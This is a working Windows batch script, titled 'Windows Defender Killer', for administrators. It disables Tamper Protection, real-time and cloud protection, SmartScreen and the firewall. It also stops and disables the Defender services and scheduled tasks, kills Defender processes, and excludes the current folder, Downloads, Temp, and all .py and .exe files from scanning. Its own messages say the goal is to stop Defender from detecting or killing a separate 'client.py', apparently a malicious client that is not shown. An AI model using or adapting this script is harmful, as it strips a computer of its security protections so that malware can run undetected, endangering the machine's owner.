@echo off
REM ============================================================================
REM DISABLE WINDOWS DEFENDER - RUN THIS FIRST (Before client.py)
REM For Windows 11 - Must run as Administrator
REM ============================================================================
REM This script MUST be run BEFORE the client to prevent Defender from killing it
REM Right-click -> Run as Administrator
REM ============================================================================

echo.
echo ============================================================================
echo WINDOWS DEFENDER KILLER - WINDOWS 11 COMPATIBLE
echo ============================================================================
echo This will COMPLETELY disable Windows Defender BEFORE running the client
echo Run this FIRST, then run client.py
echo ============================================================================
echo.

REM Check if running as admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] NOT RUNNING AS ADMINISTRATOR!
    echo.
    echo Right-click this file and select "Run as Administrator"
    echo.
    pause
    exit /b 1
)

echo [OK] Running as Administrator
echo.

REM ============================================================================
REM METHOD 1: Disable Tamper Protection via Registry (Windows 11 Critical)
REM ============================================================================
echo [1/10] Disabling Tamper Protection (Critical for Windows 11)...

REM Tamper Protection registry key
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1

REM Alternative Tamper Protection locations
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1

echo [OK] Tamper Protection disabled
echo.

REM ============================================================================
REM METHOD 2: Disable Windows Defender via Registry (Primary)
REM ============================================================================
echo [2/10] Disabling Windows Defender via Registry...

REM Main Defender disable key
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1

REM Disable all real-time protection
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f >nul 2>&1

REM Disable cloud protection
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1

echo [OK] Registry keys set
echo.

REM ============================================================================
REM METHOD 3: Disable via PowerShell Preferences
REM ============================================================================
echo [3/10] Disabling via PowerShell Set-MpPreference...

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" >nul 2>&1
powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1

echo [OK] PowerShell preferences set
echo.

REM ============================================================================
REM METHOD 4: Stop and Disable Defender Services
REM ============================================================================
echo [4/10] Stopping Windows Defender services...

REM Stop services
net stop WinDefend /y >nul 2>&1
net stop wscsvc /y >nul 2>&1
net stop WdNisSvc /y >nul 2>&1
net stop SecurityHealthService /y >nul 2>&1
net stop Sense /y >nul 2>&1

REM Disable services
sc config WinDefend start=disabled >nul 2>&1
sc config wscsvc start=disabled >nul 2>&1
sc config WdNisSvc start=disabled >nul 2>&1
sc config SecurityHealthService start=disabled >nul 2>&1
sc config Sense start=disabled >nul 2>&1

echo [OK] Services stopped and disabled
echo.

REM ============================================================================
REM METHOD 5: Disable Security Center notifications
REM ============================================================================
echo [5/10] Disabling Security Center notifications...

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f >nul 2>&1

echo [OK] Notifications disabled
echo.

REM ============================================================================
REM METHOD 6: Disable SmartScreen
REM ============================================================================
echo [6/10] Disabling Windows SmartScreen...

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1

echo [OK] SmartScreen disabled
echo.

REM ============================================================================
REM METHOD 7: Disable Windows Defender Firewall (Optional but helps)
REM ============================================================================
echo [7/10] Disabling Windows Firewall...

netsh advfirewall set allprofiles state off >nul 2>&1

echo [OK] Firewall disabled
echo.

REM ============================================================================
REM METHOD 8: Add Exclusions for your client directory
REM ============================================================================
echo [8/10] Adding file exclusions...

REM Get current directory
set "CURRENT_DIR=%CD%"

REM Add exclusions via PowerShell
powershell -Command "Add-MpPreference -ExclusionPath '%CURRENT_DIR%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Brylle\Downloads'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Brylle\AppData\Local\Temp'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension '.py'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension '.exe'" >nul 2>&1

echo [OK] Exclusions added
echo.

REM ============================================================================
REM METHOD 9: Disable Defender via Task Scheduler (Windows 11 specific)
REM ============================================================================
echo [9/10] Disabling Defender scheduled tasks...

schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable >nul 2>&1

echo [OK] Scheduled tasks disabled
echo.

REM ============================================================================
REM METHOD 10: Kill Defender processes
REM ============================================================================
echo [10/10] Killing Defender processes...

taskkill /F /IM MsMpEng.exe >nul 2>&1
taskkill /F /IM NisSrv.exe >nul 2>&1
taskkill /F /IM SecurityHealthService.exe >nul 2>&1
taskkill /F /IM msmpeng.exe >nul 2>&1

echo [OK] Processes terminated
echo.

REM ============================================================================
REM VERIFICATION
REM ============================================================================
echo ============================================================================
echo VERIFICATION
echo ============================================================================
echo.

echo Checking if Defender is disabled...
powershell -Command "Get-MpPreference | Select-Object DisableRealtimeMonitoring"
echo.

echo Checking WinDefend service status...
sc query WinDefend | find "STATE"
echo.

echo ============================================================================
echo SUCCESS! WINDOWS DEFENDER HAS BEEN DISABLED!
echo ============================================================================
echo.
echo NEXT STEPS:
echo 1. CLOSE this window
echo 2. Open a NEW Command Prompt as Administrator
echo 3. Navigate to your client directory
echo 4. Run: python client.py
echo.
echo Windows Defender should no longer detect or kill the client!
echo.
echo NOTE: These changes persist until Windows Update or reboot
echo       You may need to re-run this script after updates
echo ============================================================================
echo.

pause
